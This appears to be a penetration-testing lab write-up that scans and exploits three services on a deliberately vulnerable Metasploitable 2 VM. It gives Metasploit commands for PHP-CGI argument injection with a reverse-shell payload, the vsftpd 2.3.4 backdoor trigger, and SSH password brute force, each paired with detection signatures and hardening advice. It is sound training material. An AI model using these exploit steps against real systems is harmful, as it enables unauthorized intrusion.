# Penetration Testing Lab: Metasploitable 2

Scanning, enumerating and exploiting three services on Metasploitable 2 (a deliberately vulnerable Linux VM) from Kali Linux with Nmap and Metasploit. For each one: how the attack works, how it shows up in logs, and what would have prevented it.

> **Status:** lab notes from January 2025, updated in November 2026 with detection and hardening for each attack. This is now the single pentest write-up; the old `penetration-testing-labs` repo is archived and points here.

## Lab
| Item | Value |
|---|---|
| Target | Metasploitable 2 VM, `192.168.0.114`, isolated lab network |
| Attacker | Kali Linux VM |
| Tools | Nmap, Metasploit Framework, nbtscan, small user and password lists |

## Summary
| Port | Service | Attack | Access gained |
|---|---|---|---|
| 80 | Apache 2.2.8 with PHP-CGI | PHP-CGI argument injection (CVE-2012-1823) | Shell as `www-data` |
| 21 | vsftpd 2.3.4 | Backdoored build (CVE-2011-2523) | Root shell |
| 22 | OpenSSH 4.7p1 | Password brute force | `msfadmin` user shell (default credentials) |

---

## Port 80: PHP-CGI argument injection
1. **Service scan:**
   ```bash
   nmap -sV -p 80 192.168.0.114
   ```
   Result: Apache httpd 2.2.8 (Ubuntu) DAV/2.
2. **Directory enumeration:**
   ```
   use auxiliary/scanner/http/dir_scanner
   set RHOSTS 192.168.0.114
   run
   ```
   Found: `/cgi-bin/`, `/doc/`, `/icons/`, `/phpMyAdmin/`, `/test/`
3. **Exploit:**
   ```
   use exploit/multi/http/php_cgi_arg_injection
   set RHOSTS 192.168.0.114
   set PAYLOAD php/meterpreter/reverse_tcp
   exploit
   ```
   Result: Meterpreter session as `www-data`.

![Port 80 scan](https://github.com/user-attachments/assets/107cb422-ba35-44ff-99e8-aca5c4939686)
![Directory scan](https://github.com/user-attachments/assets/afdfdd2d-3c5c-4fef-af4d-efff3f98853f)
![Directory results](https://github.com/user-attachments/assets/8f7d3887-6ef7-456d-b44b-6ccecd2b77d8)
![Exploit setup](https://github.com/user-attachments/assets/baa9a0ab-d300-4135-820d-083467c74834)
![Exploit options](https://github.com/user-attachments/assets/8de18848-5423-4055-beec-cbe2e83d4525)
![Exploit run](https://github.com/user-attachments/assets/ee4b2f81-e6a2-4b48-85b4-d25efb275ee3)
![Meterpreter session](https://github.com/user-attachments/assets/e184259f-f2d1-4d42-83dc-bbaea9617b3d)
![Session as www-data](https://github.com/user-attachments/assets/12fa30e4-455c-4faf-8d0b-7e187a6fa241)

**How it works:** when PHP runs as CGI, a query string that starts with `-` without an `=` is passed to the PHP binary as command-line options. The exploit sends options such as `-d allow_url_include=1 -d auto_prepend_file=php://input`, and PHP then executes the request body as code.

**Detect:** web access logs with query strings that start with `-d` or `-s`, usually URL-encoded (`?-d+allow_url_include%3d1...`). That pattern has no legitimate use, so an IDS or SIEM rule on it has almost no false positives.

**Prevent:** patch PHP; don't run PHP as CGI (use PHP-FPM or the Apache module); remove `/test/` and `/phpMyAdmin/` from public reach.

---

## Port 21: vsftpd 2.3.4 backdoor
1. **Service and vuln scan:**
   ```bash
   nmap -sV --script vuln -p 21 192.168.0.114
   ```
   Result: vsftpd 2.3.4, flagged for the backdoor (CVE-2011-2523).
2. **Exploit:**
   ```
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS 192.168.0.114
   exploit
   ```
   Result: root shell.

![vsftpd scan](https://github.com/user-attachments/assets/790e5602-ba17-4b7e-bf44-a138d5dd9ed0)
![Vuln script output](https://github.com/user-attachments/assets/df4f8465-c093-43bd-828c-8a9e90a16a02)
![Exploit setup](https://github.com/user-attachments/assets/56513f6f-be22-4a65-9d02-8f35fa55b441)
![Exploit run](https://github.com/user-attachments/assets/68364a6e-844c-4499-8c83-a1f2fe603a09)
![Root shell](https://github.com/user-attachments/assets/c5bb61f1-234d-4284-a8fd-93c50728f256)

**How it works:** in 2011 the vsftpd 2.3.4 source download was replaced with a backdoored copy. A login with a username ending in `:)` makes the server open a root shell listening on TCP 6200. This is a supply-chain compromise, not a coding bug.

**Detect:** an FTP `USER` command containing `:)`, and any inbound connection to TCP 6200. Both are simple IDS signatures. A new listener on 6200 also shows up in `ss -tlnp` or EDR network telemetry.

**Prevent:** install from signed distribution packages and verify signatures on source downloads; replace FTP with SFTP; default-deny inbound firewall rules would have blocked 6200 even with the backdoor present.

---

## Port 22: SSH brute force
1. **Service scan:**
   ```bash
   nmap -sV --script vuln -p 22 192.168.0.114
   ```
   Result: OpenSSH 4.7p1 Debian.
2. **Brute force:**
   ```
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS 192.168.0.114
   set USER_FILE usernames.txt
   set PASS_FILE passwords.txt
   set STOP_ON_SUCCESS true
   exploit
   ```
   Result: valid login `msfadmin:msfadmin`, which is the VM's default account.
3. **Use the session:**
   ```
   sessions -i 2
   whoami
   ls
   ```

![SSH scan](https://github.com/user-attachments/assets/8c5c868f-e28d-4d49-9acd-4324fa26e992)
![ssh_login setup](https://github.com/user-attachments/assets/979298d1-f05f-4f3c-980d-6f3360184a6c)
![Credentials found](https://github.com/user-attachments/assets/8ef8febe-bd55-4c94-bea7-25566bb363f4)
![Session list](https://github.com/user-attachments/assets/35c29a44-ea34-4f73-8305-7708365be408)
![Shell as msfadmin](https://github.com/user-attachments/assets/3a62c976-7ea4-4b36-9599-ffb1420bcd54)

**How it works:** the attack only had to guess, and the account still used its well-known default password.

**Detect:** bursts of `Failed password` lines in `/var/log/auth.log` from one source, then an `Accepted password` from the same source. The [Splunk lab](https://github.com/Hawkode/splunk-security-logs) has the search, and the [Snort lab](https://github.com/Hawkode/Snort-Lab) has a matching network rule (SID 1000003).

**Prevent:** change default credentials at build time; set `PasswordAuthentication no` and use keys; rate-limit with fail2ban; allow SSH only from admin networks.

---

## What this lab shows
- **Two of three entry points were configuration, not code:** a default password, and a service exposed that should never have been reachable. Patching alone fixes neither.
- **Every attack here leaves a clear signal** (an odd query string, a strange FTP username, a burst of failed logins). Detection is cheap if those logs are collected and someone looks at them.
- **Next step after a foothold:** privilege escalation. The Windows side of that is covered in the [Windows Privilege Escalation lab](https://hawkode.github.io/projects/windows-privilege-escalation/).
